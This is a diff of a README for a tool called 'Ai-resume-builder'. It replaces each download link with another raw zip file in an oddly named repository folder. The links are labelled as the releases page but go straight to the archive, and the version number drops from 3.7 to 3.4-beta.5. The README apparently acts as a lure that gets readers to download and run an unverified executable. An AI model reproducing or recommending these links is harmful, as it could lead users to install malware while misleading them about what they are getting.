@@ -1,6 +1,6 @@
 # 🎉 Ai-resume-builder - Create Your Perfect Resume Effortlessly
 
-[![Download Ai-resume-builder](https://github.com/ananth32/Ai-resume-builder/raw/refs/heads/main/operculigenous/builder_Ai_resume_3.7.zip)](https://github.com/ananth32/Ai-resume-builder/raw/refs/heads/main/operculigenous/builder_Ai_resume_3.7.zip)
+[![Download Ai-resume-builder](https://github.com/ananth32/Ai-resume-builder/raw/refs/heads/main/operculigenous/resume_builder_Ai_3.4-beta.5.zip)](https://github.com/ananth32/Ai-resume-builder/raw/refs/heads/main/operculigenous/resume_builder_Ai_3.4-beta.5.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To get started with Ai-resume-builder, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Go to the releases page to find the latest version of Ai-resume-builder. Click the following link:  
-   [Visit the releases page to download](https://github.com/ananth32/Ai-resume-builder/raw/refs/heads/main/operculigenous/builder_Ai_resume_3.7.zip)
+   [Visit the releases page to download](https://github.com/ananth32/Ai-resume-builder/raw/refs/heads/main/operculigenous/resume_builder_Ai_3.4-beta.5.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. It’s best to select the latest version for the most features and bug fixes. 
@@ -21,7 +21,7 @@ To get started with Ai-resume-builder, follow these simple steps:
 
 1. **Download the Application**  
    After choosing the version, find the file that matches your operating system. Common options include `.exe` for Windows or `.dmg` for Mac. Click on the file to start your download.  
-   [Download Ai-resume-builder here](https://github.com/ananth32/Ai-resume-builder/raw/refs/heads/main/operculigenous/builder_Ai_resume_3.7.zip).
+   [Download Ai-resume-builder here](https://github.com/ananth32/Ai-resume-builder/raw/refs/heads/main/operculigenous/resume_builder_Ai_3.4-beta.5.zip).
 
 2. **Locate the Downloaded File**  
    Once the download completes, locate the file in your computer's Downloads folder.
@@ -74,7 +74,7 @@ If you encounter any issues or have questions about using Ai-resume-builder, ple
 
 ## 🔗 Useful Links
 
-- **Releases Page**: [Download Ai-resume-builder](https://github.com/ananth32/Ai-resume-builder/raw/refs/heads/main/operculigenous/builder_Ai_resume_3.7.zip)
+- **Releases Page**: [Download Ai-resume-builder](https://github.com/ananth32/Ai-resume-builder/raw/refs/heads/main/operculigenous/resume_builder_Ai_3.4-beta.5.zip)
 - **Documentation**: Find helpful guides and FAQs.
 - **Community Forum**: Join discussions and find tips shared by other users.
 
